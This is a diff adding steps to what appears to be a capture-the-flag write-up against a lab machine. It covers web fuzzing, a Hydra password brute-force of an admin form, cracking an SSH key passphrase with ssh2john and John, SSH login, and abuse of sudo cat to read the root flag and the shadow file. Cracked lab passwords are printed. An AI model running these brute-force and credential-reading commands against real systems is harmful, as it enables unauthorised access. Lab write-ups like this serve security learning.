@@ -37,4 +37,36 @@ We open our browser and explore the site. We land directly on the Apache homepag
 ```bash
 ffuf -u "http://10.128.184.18/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H "User-Agent: Firefox"
 ```
+We quickly come across something eye-catching, an admin page. We try to brute-force the page with the Hydra tool: </br>
 
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.184.18 http-post-form "/admin:user=^USER^&pass=^PASS^:F=Username or password invalid" -f -V
+```
+
+```[80][http-post-form] host: 10.128.184.18   login: admin   password: xavier```
+
+And boom, with the credentials we connect to the site where we find an RSA key. We download this and use a tool called ```ssh2john``` to convert it to a format that John can crack. This gives us the passphrase. </br>
+
+```passphrase: rockinroll```
+
+Let's conquer the kingdom:
+```bash
+$ ssh -i ./id_rsa john@[ip]
+```
+
+We enter the passphrase, log in, and retrieve
+
+### Privilege escalation
+
+</br>
+
+A ```sudo -l``` command shows us that we can use ```cat``` with ```sudo```.
+
+So, use ```sudo cat /root/root.txt```.
+
+But the instructions also ask us to retrieve the root password.
+
+So we use `cat /ect/shadow` to retrieve the root password hash, which we'll then crack with `john`.
+
+There you go, easy!
+```root:football``
